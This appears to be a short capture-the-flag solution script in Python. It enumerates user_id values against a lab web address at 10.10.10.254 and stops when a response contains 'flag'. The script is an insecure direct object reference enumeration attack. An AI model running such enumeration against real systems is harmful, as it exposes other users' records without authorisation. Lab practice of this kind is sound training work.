import requests
import time
for i in range (0,90):
    req = requests.get(f'http://10.10.10.254/Seleksi/?user_id={i}')
    print(req.text)
    time.sleep(0.5)
    if "flag" in req.text:
        print(req.text)
        break
    elif "User not found" in req.text:
        break